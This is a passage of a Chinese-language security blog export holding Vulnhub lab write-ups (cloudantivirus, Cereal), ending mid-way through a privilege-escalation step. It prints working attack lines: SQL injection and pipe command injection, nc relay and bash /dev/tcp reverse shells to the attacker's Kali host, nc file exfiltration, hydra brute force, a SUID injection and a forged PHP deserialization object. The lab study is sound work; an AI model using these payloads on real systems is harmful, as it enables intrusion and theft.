<p>最后读取flag： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// /root/flag.txt</span><br><span class="line"></span><br><span class="line"> ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______ </span><br><span class="line"> /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/ </span><br><span class="line">                                                                                                            </span><br><span class="line">                                                                                                            </span><br><span class="line">    _________                                     __        .__          __  .__                     ._.    </span><br><span class="line">    \_   ___ \  ____   ____    ________________ _/  |_ __ __|  | _____ _/  |_|__| ____   ____   _____| |    </span><br><span class="line">    /    \  \/ /  _ \ /    \  / ___\_  __ \__  \\   __\  |  \  | \__  \\   __\  |/  _ \ /    \ /  ___/ |    </span><br><span class="line">    \     \___(  &lt;_&gt; )   |  \/ /_/  &gt;  | \// __ \|  | |  |  /  |__/ __ \|  | |  (  &lt;_&gt; )   |  \\___ \ \|    </span><br><span class="line">     \______  /\____/|___|  /\___  /|__|  (____  /__| |____/|____(____  /__| |__|\____/|___|  /____  &gt;__    </span><br><span class="line">            \/            \//_____/            \/                     \/                    \/     \/ \/    </span><br><span class="line">                                                                                                            </span><br><span class="line">                                                                                                            </span><br><span class="line">  ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______ </span><br><span class="line"> /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/ </span><br><span class="line">                                                                                                            </span><br><span class="line">                                                                                                            </span><br><span class="line">Did you had fun? :)</span><br><span class="line">https://scriptkidd1e.wordpress.com</span><br><span class="line"></span><br><span class="line">Tweet me your writeup!</span><br><span class="line">https://twitter.com/sec_9emin1</span><br><span class="line"></span><br><span class="line">  ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______   ______</span><br><span class="line"> /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/  /_____/</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机怎么说呢，对我来说难度很高，因为我对redis不是很熟悉，并且在爆破code的时候也耽误了很久。</p>
<p>不过通过对该靶机的渗透让我觉得，只要是第三方服务，都有可能存在漏洞，尤其关注配置文件。</p>
<p>还有一点，路径扫描多用不同工具扫！！！</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>WAF Bypass</tag>
        <tag>Anto CSRF token</tag>
        <tag>隐藏路径爬取</tag>
        <tag>redis漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>2. Vulnhub cloudantivirus writeup</title>
    <url>/2022/03/29/2.%20Vulnhub%20cloudantivirus%20writeup/</url>
    <content><![CDATA[<p>该靶机难度简单。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/</p>
<p>难度：Easy</p>
<p>虚拟机软件：Virtual Box</p>
<h1 id="网卡配置">网卡配置</h1>
<p>查看 <strong>第一周</strong> 的信息。 攻击主机 kali：<code>192.168.137.104</code></p>
<h1 id="渗透">渗透</h1>
<h2 id="主机发现">主机发现</h2>
<p>可以使用 <code>sudo arp-scan -l</code>，也可以使用 <code>arping</code> 。后者速度慢，效率低，但是有一个好处就是后者是一个<strong>网络工具</strong>，而前者是一个<strong>黑客工具</strong>，这就意味着大部分Linux都会装前者，而只有kali这种的才会装后者。因此，在内网渗透的时候目标主机可能没有前者，这时候就能使用后者了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 254);do sudo arping -c 2 192.168.137.$i;done</span><br></pre></td></tr></table></figure>
<p>与 ping 类似，一次只能扫描一个IP。<code>-c</code> 后面的参数指的是每个IP的发包次数。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204936.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204715.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204836.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329204826.png" /></p>
<p><code>192.168.137.100</code> 是主机在这个网段的IP；<code>192.168.137.1</code> 是网关；<code>192.168.137.104</code> 是kali IP；那么<code>192.168.137.103</code> 就是目标靶机了。</p>
<p>从扫描结果也可以看出这个工具并不会将本机主机当作存活主机！</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205256.png" /></p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329205415.png" /></p>
<ol type="1">
<li>22端口上的服务是 openssh</li>
<li>靶机系统为 Ubuntu</li>
<li>8080端口的服务是 http，信息与第1周一样</li>
<li>靶机上存在着 python2 环境</li>
</ol>
<h2 id="访问-http-服务">访问 http 服务</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211057.png" /></p>
<p>接下来，当然要进行<strong>目录扫描</strong>，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211439.png" /></p>
<p>有一个 <code>/console</code>，打开如下</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211506.png" /></p>
<p>这边暂时没有头绪，先放着，去测试一下网页的功能点。</p>
<p>接下来要用 burp 抓包，所以先设置一下代理，将浏览器的代理设置为如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329211629.png" /></p>
<p>端口其实可以设置为其他的，只要和 burp 中的保持一致即可。</p>
<p>发现需要输入验证码，这里可能存在注入点，<strong>先用burp fuzz 一下键盘上的特殊字符</strong>。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212320.png" /></p>
<p>发现当输入双引号的时候出现了不一样的提示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212405.png" /></p>
<p>从这报错信息中可以看到：</p>
<ol type="1">
<li>路径信息</li>
<li>模板为 flask</li>
<li>存在 sql 注入语句，闭合方式为双引号</li>
</ol>
<h2 id="sql-注入">sql 注入</h2>
<p>根据 sql 查询语句构造如下 payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;or 1=1-- </span><br><span class="line">最后面有一个空格！！！</span><br></pre></td></tr></table></figure></p>
<p>成功进入！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329212626.png" /></p>
<p>观察这些文件，发现这跟在命令行执行 <code>ls -l</code> 返回的结果很像。并且这是一个云反病毒的程序，因此我们输入文件名之后，后台肯定执行了某条命令，假设为 <code>cloudav filename</code> 。我们知道 Linux 系统中可以一次性执行多条命令，方式有很多，可以通过 <code>|</code>, <code>||</code>, <code>&amp;</code>, <code>&amp;&amp;</code>, <code>;</code> 等符号的帮忙做到，这里选用管道符，输入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|id</span><br></pre></td></tr></table></figure></p>
<p>发现确实可以执行，因此，接下来就可以考虑弹shell了。</p>
<h2 id="反弹-shell">反弹 shell</h2>
<p>第一周中使用的是 python 反弹，这里的环境与第一周一样，也是可以用 python 的。但是由于现在属于学习阶段，因此就使用不同的办法，这里使用 <code>nc</code>。</p>
<p>在kali上启动监听： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>王爷输入命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 4444 -e /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>这里发现kali并没有。这是因为， <code>-e</code> 这个参数不是所有的 <code>nc</code> 版本都有，可以使用 <code>which nc</code> 查看对方主机是否有 <code>nc</code> ，如果有的话则说明，不存在 <code>-e</code> 操作。这里执行 <code>hello|which nc</code> 弹出信息 <code>/bin/nc</code> 说明对方主机存在 <code>nc</code> 但是没有参数 <code>-e</code>。</p>
<p>此时可以使用 <strong>nc串联</strong>！！！操作如下：</p>
<p>第一步，kali 开两个命令行窗口分别监听： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 3333</span><br><span class="line">2. nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>第二步，网页输入命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello|nc 192.168.137.104 3333|/bin/sh|nc 192.168.137.104 4444</span><br></pre></td></tr></table></figure></p>
<p>解释一下这个意思：</p>
<blockquote>
<p>首先得知道管道符的作用。举个例子，<code>cmd1|cmd2</code>，在这里cmd1执行完之后将结果作为参数传入cmd2（至于cmd2用不用就是得看cmd2本身需不需传参）。现在来解释一下那句命令，假设kali输入命令 <code>ls</code>，然后通过3333端口到达靶机，靶机通过<code>nc 192.168.137.104 3333</code>接收到后将命令通过管道符传给 <code>/bin/sh</code>，shell执行完命令<code>ls</code>后，将结果通过<code>nc 192.168.137.104 4444</code>传入到kali，kali监听4444端口，得到<code>ls</code>执行的结果。</p>
</blockquote>
<p>结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329215902.png" /></p>
<p>查看 id 发现是 scanner，不是 root。因此，接下来就需要提权。</p>
<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
<p>第一周用的是<strong>内核漏洞提权</strong>，本周换一个办法。</p>
<p>现在靶机上进行信息收集，看到了 <code>templates</code>，根据之前收集到的信息，这应该是 <code>flask</code> 搭建的模板文件。对我们的提权没有作用，注意到有一个 <code>.sql</code> 文件，这是数据库的文件，查看一下是否有账号和密码这些隐私。</p>
<p>利用 <code>file database.sql</code> 发现打不开，后来发现是因为靶机上没有 <code>sqlite</code>，至于为什么是 sqlite，这是因为 sql 注入的报错信息提示的。那么就将这个文件发到kali上打开。</p>
<p>kali打开监听器： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 5555 &gt; db.sql</span><br></pre></td></tr></table></figure></p>
<p>靶机输入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.137.104 5555 &lt; dabase.sql</span><br></pre></td></tr></table></figure></p>
<p>一段时间（保证文件传输完毕）后手动断开连接，接着打开该文件： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sqlite3</span><br><span class="line">2. .open db.sql</span><br><span class="line">3. .database</span><br><span class="line">4. .dump</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329221819.png" /></p>
<p>此时获得了密码，接下来可以尝试一下获取和 shell 有关的账号，然后与这些密码组合进行爆破攻击。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd|grep /bin/bash</span><br></pre></td></tr></table></figure></p>
<p>发现有三个账号。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222213.png" /></p>
<p>接下来将用户名保存为一个文件，密码为另一个文件，然后使用 <code>hydra</code> 爆破 ssh。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l user.txt -p passwd.txt ssh://192.168.137.103</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329222931.png" /></p>
<p>发现爆破没有成功的。这件事告诉我们，有时候自认为很有用的密码，并没有什么用。错误没什么可怕的，可怕的是不敢尝试！</p>
<p>一个小秘密，上面搜集的密码可以用来登录之前 sql 注入的地方。</p>
<p>接下来想想还有什么办法可以提权？对了，<strong><code>SUID</code> 提权</strong>也是Linux本地提权常用的一种办法。</p>
<blockquote>
<p>某个程序如果具有 suid 的权限，那么这台主机上的任何用户执行该程序都将默认继承该程序属主的权限。如果属主是root，那么该程序就是用root权限执行的，那么就可以想办法利用该程序去获得shell。</p>
</blockquote>
<p>发现该目录下并没有suid权限的程序，往上一个目录查找，发现！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329223319.png" /></p>
<p>注意中间那个程序最前面有一个 <code>s</code>。这就是 suid 权限的标志！！！然后注意到下面还有一个.c文件，这应该就是源码了，查看源码： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *freshclam=<span class="string">&quot;/usr/bin/freshclam&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(freshclam) + <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, freshclam, argv[<span class="number">1</span>]);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(command);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>解释一下该源码，从<code>argv[1]</code>看出该程序接收一个参数，并且这个参数和 <code>freshclam</code> 构成一个<code>command</code>，然后 <code>system(command)</code> 执行 命令。因此，我们能够控制的就是 <code>argv[1]</code> 这个参数。</p>
<p>kali再开两个命令行窗口，然后分别执行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. nc -lvnp 5555</span><br><span class="line">2. nc -lvnp 6666</span><br></pre></td></tr></table></figure></p>
<p>靶机执行如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./update_cloudav &quot;a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666&quot;</span><br></pre></td></tr></table></figure></p>
<p>注意，（<strong>一定要在最前面加上|,就算没有a，也要有|</strong>）这样构成的命令就是这样： <code>/usr/bin/freshclam a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>，这是一个完整的命令，是可以被执行的。</p>
<p>如果前面没有|，则构成<code>/usr/bin/freshclam nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>，会先执行 <code>/usr/bin/freshclam nc 192.168.137.104 5555</code>，这样子nc串联就断开了，无法获得shell。</p>
<p>最终成功获得 root 权限！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329225809.png" /></p>
<h1 id="总结">总结</h1>
<p>通过对该虚拟机的渗透，学到了：</p>
<ol type="1">
<li><code>arping</code> 进行主机发现</li>
<li>nc串联反弹shell</li>
<li>suid提权</li>
</ol>
<p>疑点：访问 http 服务那有一个地方需要输入 pin 码，还没找到</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>21 Vulnhub Cereal Writeup ⭐</title>
    <url>/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/</url>
    <content><![CDATA[<p>该靶机难度我认为很高，比较贴近真实场景，尤其是权限提升的时候，需要一定的耐心和细心。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/cereal-1,703/">Cereal: 1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>高（接近真实场景）</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>路径枚举</li>
<li>密码爆破</li>
<li>域名解析</li>
<li>匿名FTP</li>
<li><strong>子域名爆破</strong></li>
<li>源码审计</li>
<li>反序列化漏洞</li>
<li><strong>进程监视</strong></li>
<li>软链接</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.25</span><br><span class="line">sudo nmap -p21,22,80,139,445,3306,11111,22222,22223,33333,44441,44444,55551,55555 -A 10.0.2.25</span><br></pre></td></tr></table></figure>
<p>该靶机开放的端口很多。信息如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">11111/tcp open  vce</span><br><span class="line">22222/tcp open  easyengine</span><br><span class="line">22223/tcp open  unknown</span><br><span class="line">33333/tcp open  dgi-serv</span><br><span class="line">33334/tcp open  speedtrace</span><br><span class="line">44441/tcp open  unknown</span><br><span class="line">44444/tcp open  cognex-dataman</span><br><span class="line">55551/tcp open  unknown</span><br><span class="line">55555/tcp open  unknown</span><br></pre></td></tr></table></figure></p>
<p>可以一一对各个端口的服务进行查看。</p>
<p>首先查看21端口，利用-A参数知道可以匿名登录，因此使用下面命令连接 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ftp 10.0.2.25</span><br><span class="line">2. Anonymous</span><br><span class="line">3. 密码为空，直接回车</span><br></pre></td></tr></table></figure></p>
<p>只有一个pub目录，并且该目录为空，尝试上传文件也失败了 <figure class="highlight plaintext"><figcaption><span>put hello.txt</span></figcaption><table><tr><td class="code"><pre><span class="line">local: hello.txt remote: hello.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||56531|)</span><br><span class="line">550 Permission denied.</span><br></pre></td></tr></table></figure></p>
<p>因此尝试其他端口。</p>
<p>其中139和445端口上的服务可能是mssql，经查看没有可利用的地方；3306禁止kali的ip连接，可能没有开启外连；44441和80端口的服务都是http，其他端口虽然开放，也可以用nc连接的上，但是无论输入任何命令，服务器都不会有响应，因此，这些端口可能只是一个幌子，还有可能是蜜罐。</p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<h3 id="端口">2.2.1. 80端口</h3>
<p>直接访问，发现这就是apache的一个默认界面，但是，知道了靶机的操作系统为Rocky Linux。接着查看源码、抓包都没有什么有用的信息，因此直接进行目录扫描。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.25 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505095018.png" /></p>
<p>注意到两个可以的目录: admin, blog。</p>
<p>首先是admin，这是一个登录界面，可以尝试对其进行爆破，但是最终一无所获。对其再次进行路径扫描，并没有发现有用的信息。</p>
<p>后者是得到一个界面，该界面中主要有3个信息：</p>
<ol type="1">
<li>一个域名：cereal.ctf</li>
<li>搜索框</li>
<li>back up，也就是说cereal.ctf下面可能存在备份信息</li>
</ol>
<p>尝试对搜索框进行测试，并没有漏洞。对blog进行路径扫描，会发现许多文件，但一一查看之后，并没有可以利用的。在测试过程中，发现许多的功能都转到了cereal.ctf下，因此尝试将其加入到/etc/hosts之后再次进行尝试，还是一无所获。</p>
<h3 id="端口-1">2.2.2. 44441端口</h3>
<p>页面非常简单，就一句话 "Coming soon..."，因此对该目录进行路径扫描 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.25:44441/ -w /usr/share/dirb/wordlists/common.txt </span><br></pre></td></tr></table></figure></p>
<p>没有找到任何有用的信息，如果使用域名呢？ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://cereal.ctf:44441/ -w /usr/share/dirb/wordlists/common.txt </span><br></pre></td></tr></table></figure></p>
<p>与上面的一样，没有任何有用的信息。联想到，既然靶机给了我们一个域名，那是不是存在子域名？因此尝试扫描一下是否有子域名： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://cereal.ctf:44441/ -t 20 -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt|grep <span class="string">&quot;Status: 200&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>得到一个 secure.cereal.ctf 子域名，将其添加到hosts中，然后访问</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505102057.png" /></p>
<p>终于得到一个功能点，这看起来像是执行了系统命令ping，因此后台可能存在着命令执行的漏洞，但是输入<code>127.0.0.1;ls</code>时，结果是空白，应该是做了一定的过滤。</p>
<p>对其进行路径扫描，得到一个/php，直接访问它，发现了一个值得怀疑的点，那就是该文件第一行就是定义了一个序列化的函数。我们抓包查看一下我们点击ping时的数据</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505102517.png" /></p>
<p>经过url decode，原来真的是经过了序列化之后的数据。反序列化的漏洞很难在黑盒的情况下进行利用，所以我们需要找到源码，联想到刚刚有一个备份文件没有找到,这里换一个工具进行扫描，gobuster我没扫出来： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ </span><br></pre></td></tr></table></figure></p>
<p>扫描出一个 back_en 目录，该目录不让直接访问，扫描一下该目录下是是否存在备份文件 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://secure.cereal.ctf:44441/back_en</span><br></pre></td></tr></table></figure></p>
<p>（感觉扫常规的目录和文件，dirsearch更快）扫出一个index.php.bak，直接访问查看源码，得到如下php代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = <span class="literal">False</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isValid) &#123;</span><br><span class="line">			<span class="keyword">if</span> (filter_var(<span class="keyword">$this</span>-&gt;ipAddress, FILTER_VALIDATE_IP))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;isValid = <span class="literal">True</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ping();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isValid) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;output = shell_exec(<span class="string">&quot;ping -c 3 <span class="subst">$this</span>-&gt;ipAddress&quot;</span>);	</span><br><span class="line">		&#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = unserialize(urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = <span class="keyword">new</span> pingTest;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pingTest</span>-&gt;validate();</span><br></pre></td></tr></table></figure></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>通过代码审计可以得知，如果输入127.0.0.1;ls，那么无法通过validate()的过滤，但是只要 isValid 为True就可以直接绕过过滤函数，因此构造方法也很简单： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1;id&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = <span class="literal">True</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> pingTest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$obj</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505105448.png" /></p>
<p>命令被成功执行。然后我使用了which nc，发现没有回显，还以为没有nc，但是 nc 10.0.2.4 3333 时却可以连接到我的主机，所以其实是有nc的，直接通过nc反弹shell。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505105659.png" /></p>
<p>还可以通过下面的命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|bash -i &gt;&amp; /dev/tcp/10.0.2.4/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>重点在后半句，解释如下：</p>
<table>
<thead>
<tr class="header">
<th>命令</th>
<th>详解</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>bash -i</td>
<td>产生一个bash环境</td>
</tr>
<tr class="even">
<td><code>&gt;&amp;</code></td>
<td>将&amp;前面的内容与后面的内容相结合，然后一起重定向给后者</td>
</tr>
<tr class="odd">
<td>/dev/tcp/ip/port</td>
<td>让目标主机与攻击机ip的port建立一个tcp连接</td>
</tr>
<tr class="even">
<td>0&gt;&amp;1</td>
<td>将标准输入与标准输出内容相结合，然后重定向给标准输出</td>
</tr>
</tbody>
</table>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>首先进行常规的一些信息收集，内核、sudo，suid，都没有可以使用的点。查看端口和进程也没有可以利用的。与bash有关的用户只有两个: rocky, root。</p>
<p>这里的提权使用到之前没有用过的方法，<strong>就是通过监视进程的产生，从而确定产生该进程的命令，然后利用这些命令中涉及到的脚本/程序来提权</strong>。首先需要一个工具 pspy64 或者 linpeas.sh（这个好像是一个信息收集的工具）</p>
<ul>
<li><a href="https://github.com/carlospolop/PEASS-ng/releases">Releases · carlospolop/PEASS-ng · GitHub</a></li>
<li><a href="https://github.com/DominicBreuker/pspy">GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions</a></li>
</ul>
<p>先在kali下载，然后通过nc传到靶机，并给予执行权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./pspy</span><br></pre></td></tr></table></figure>
<p>注意到有这么一行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMD: UID=0    PID=24316  | /bin/bash /usr/share/scripts/chown.sh</span><br></pre></td></tr></table></figure></p>
<p>该脚本由root运行，并且看这名字像是更改属主的脚本，通过 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -l /usr/share/scripts/chown.sh</span><br><span class="line">-rw-r--r--. 1 root root 45 May 29  2021 /usr/share/scripts/chown.sh</span><br></pre></td></tr></table></figure></p>
<p>发现我们拥有读的权限。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /usr/share/scripts/chown.sh</span><br><span class="line"></span><br><span class="line">chown rocky:apache /home/rocky/public_html/*</span><br></pre></td></tr></table></figure></p>
<p>该脚本的作用就是将/home/rocky/public_html/目录下面的所有文件的属主改为rocky，所有组改为apache。</p>
<p>并且该脚本并不是指运行一次：（我一直开着pspy监视进程） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2022/05/05 04:20:01 CMD: UID=0    PID=24316  | /bin/bash /usr/share/scripts/chown.sh</span><br><span class="line">2022/05/05 04:30:01 CMD: UID=0    PID=24389  | /bin/bash /usr/share/scripts/chown.sh </span><br><span class="line">2022/05/05 04:40:01 CMD: UID=0    PID=42855  | /bin/bash /usr/share/scripts/chown.sh </span><br></pre></td></tr></table></figure></p>
<p>从执行时间可以看到，好像是每隔10分钟就会自动执行一次，这让我想到了cron，那如何利用这个呢？</p>
<blockquote>
